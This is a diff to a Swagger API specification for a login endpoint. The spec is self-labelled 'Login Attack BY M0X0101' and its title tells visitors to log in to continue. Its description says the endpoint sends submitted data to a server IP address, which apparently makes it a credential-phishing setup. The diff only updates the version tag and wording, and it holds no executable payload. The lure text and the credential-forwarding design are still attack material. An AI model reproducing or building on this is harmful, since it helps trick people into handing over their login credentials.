@@ -1,7 +1,7 @@
 swagger: "2.0"
 info:
-  title: /*Login Attack BY M0X0101*/ Hello user plese make login blow to contaniue thanks
-  description: An API that allows users to log in to a web application and send data to a server IP address
+  title: /*Login Attack BY M0X0101 V2.0*/ Hello user plese make login blow to contaniue thanks 
+  description: An API that allows users to log in to a web application and send data to a server IP address using the POST method
   version: "1.0"
 
 basePath: /api
@@ -13,7 +13,7 @@ schemes:
 paths:
   /login:
     post:
-      summary: Logs a user in to the web application and sends data to a server IP address
+      summary: Logs a user in to the web application and sends data to a server IP address using the POST method
       consumes:
         - application/json
       produces:
@@ -52,4 +52,3 @@ paths:
                 description: A success message indicating that data has been sent to the server
         400:
           description: Invalid login credentials or missing server IP address
-  
